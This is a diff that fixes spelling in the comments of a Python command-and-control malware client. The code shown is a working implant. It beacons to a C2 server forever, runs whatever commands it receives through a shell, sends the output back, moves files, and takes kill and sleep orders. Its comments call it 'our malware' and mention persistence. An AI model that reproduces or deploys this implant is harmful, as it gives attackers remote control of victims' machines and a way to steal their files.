@@ -18,7 +18,7 @@ elif platform == "darwin":
 else:
     client = "unknown" + "@" + "unknown" + "@" + str(time())
 
-# UTF-8 encode the client first to be able to encrypt it, but then we must decode it after the encyption
+# UTF-8 encode the client first to be able to encrypt it, but then we must decode it after the encryption
 encrypted_client = cipher.encrypt(client.encode()).decode()
 
 def post_to_server(message: str, response_path: str = RESPONSE):
@@ -41,7 +41,7 @@ def get_third_item(input_string, replace=True):
     except IndexError:
         post_to_server(f"You must enter an argument after {input_string}.\n")
 
-# Try an HTTP GET request to the c2 server and retrive a response; if it fails, keep trying forever
+# Try an HTTP GET request to the c2 server and retrieve a response; if it fails, keep trying forever
 while True:
     try:
         response = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
@@ -53,10 +53,10 @@ while True:
         sleep(DELAY)
         continue
     
-    # Retrieve the command via the decrypted and decoded content ot the response object
+    # Retrieve the command via the decrypted and decoded content of the response object
     command = cipher.decrypt(response.content).decode()
 
-    # If the command starts with "cd ", sliece out directory and chdir to it
+    # If the command starts with "cd ", slice out directory and chdir to it
     if command.startswith("cd "):
         directory = command[3:]
         try:
@@ -72,18 +72,18 @@ while True:
         else:
             post_to_server(getcwd(), CWD_RESPONSE)
 
-    # If command dosen't start with client, run an OS command and send the output to the c2 server
+    # If command doesn't start with client, run an OS command and send the output to the c2 server
     elif not command.startswith("client "):
         command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
         post_to_server(command_output.decode())
 
-    # The "client download FILENAME" command allows is ti transfer files to the client from our c2 server
+    # The "client download FILENAME" command allows us to transfer files to the client from our c2 server
     elif command.startswith("client download"):
 
         # Split out the filepath to download and replace \ with /
         filepath = get_third_item(command)
 
-        # If we had an Index Error, start a new interation of the while loop
+        # If we had an IndexError, start a new iteration of the while loop
         if filepath is None:
             continue
 
@@ -156,7 +156,7 @@ while True:
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on client.\n")
                     
-    # The "client kill" command will shut down our malware; make sure we have persistance!
+    # The "client kill" command will shut down our malware; make sure we have persistence!
     elif command.startswith("client kill"):
         post_to_server(f"{client} has been killed.\n")
         exit()
@@ -168,7 +168,7 @@ while True:
             if delay < 0:
                 raise ValueError
         except (IndexError, ValueError):
-            post_to_server("You must enter in a positive number for the amount of time to sleep in second.\n")
+            post_to_server("You must enter in a positive number for the amount of time to sleep in seconds.\n")
         else:
             post_to_server(f"{client} will sleep for {delay} seconds.\n")
             sleep(delay)
